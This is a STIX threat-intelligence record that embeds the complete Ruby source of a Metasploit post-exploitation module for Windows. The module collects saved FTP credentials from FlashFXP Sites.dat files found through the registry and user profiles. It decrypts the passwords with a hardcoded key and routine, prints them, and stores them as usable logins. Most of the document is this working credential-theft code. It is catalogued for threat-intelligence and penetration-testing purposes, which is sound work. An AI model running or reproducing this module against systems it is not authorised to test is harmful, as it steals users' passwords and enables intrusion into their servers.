{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--97a01c74-400b-4a91-877c-135c90dd6582",
    "created": "2024-08-14T16:33:08.762473Z",
    "modified": "2024-08-14T16:33:08.762477Z",
    "name": "Windows Gather FlashFXP Saved Password Extraction",
    "description": " This module extracts weakly encrypted saved FTP Passwords from FlashFXP. It finds saved FTP connections in the Sites.dat file.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/flashfxp.rb",
            "external_id": "flashfxp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather FlashFXP Saved Password Extraction',\n        'Description' => %q{\n          This module extracts weakly encrypted saved FTP Passwords from FlashFXP. It\n          finds saved FTP connections in the Sites.dat file.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'theLightCosine'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    # Checks if the Site data is stored in a generic location  for all users\n    flash_reg = 'HKLM\\\\SOFTWARE\\\\FlashFXP'\n    flash_reg_ver = registry_enumkeys(flash_reg.to_s)\n\n    # Ini paths\n    @fxppaths = []\n\n    unless flash_reg_ver.nil?\n      software_key = \"#{flash_reg}\\\\#{flash_reg_ver.join}\"\n      generic_path = registry_getvaldata(software_key, 'InstallerDataPath') || ''\n      unless generic_path.include? '%APPDATA%'\n        @fxppaths << generic_path + '\\\\Sites.dat'\n      end\n    end\n\n    grab_user_profiles.each do |user|\n      next if user['AppData'].nil?\n\n      tmpath = user['AppData'] + '\\\\FlashFXP\\\\'\n      get_ver_dirs(tmpath)\n    end\n\n    @fxppaths.each do |fxp|\n      get_ini(fxp)\n    end\n  end\n\n  def get_ver_dirs(path)\n    session.fs.dir.foreach(path) do |sub|\n      next if sub =~ /^(\\.|\\.\\.)$/\n\n      @fxppaths << \"#{path}#{sub}\\\\Sites.dat\"\n    end\n  rescue StandardError\n    print_error(\"The following path could not be accessed or does not exist: #{path}\")\n  end\n\n  def get_ini(filename)\n    config = client.fs.file.new(filename, 'r')\n    parse = config.read\n    ini = Rex::Parser::Ini.from_s(parse)\n\n    if ini == {}\n      print_error(\"Unable to parse file, may be encrypted using external password: #{filename}\")\n    end\n\n    ini.each_key do |group|\n      host = ini[group]['IP']\n      username = ini[group]['user']\n      epass = ini[group]['pass']\n      port = ini[group]['port']\n      next if epass.nil? || (epass == '')\n\n      passwd = decrypt(epass)\n\n      print_good(\"*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***\")\n      service_data = {\n        address: Rex::Socket.getaddress(host),\n        port: port,\n        protocol: 'tcp',\n        service_name: 'ftp',\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        username: username,\n        private_data: passwd,\n        private_type: :password\n      }\n\n      credential_core = create_credential(credential_data.merge(service_data))\n\n      login_data = {\n        core: credential_core,\n        access_level: 'User',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      create_credential_login(login_data.merge(service_data))\n    end\n  rescue StandardError\n    print_status(\"Either could not find or could not open file #{filename}\")\n  end\n\n  def decrypt(pwd)\n    key = 'yA36zA48dEhfrvghGRg57h5UlDv3'\n    pass = ''\n    cipher = [pwd].pack('H*')\n\n    (0..cipher.length - 2).each do |index|\n      xored = cipher[index + 1, 1].unpack('C').first ^ key[index, 1].unpack('C').first\n      if ((xored - cipher[index, 1].unpack('C').first < 0))\n        xored += 255\n      end\n      pass << (xored - cipher[index, 1].unpack('C').first).chr\n    end\n    return pass\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}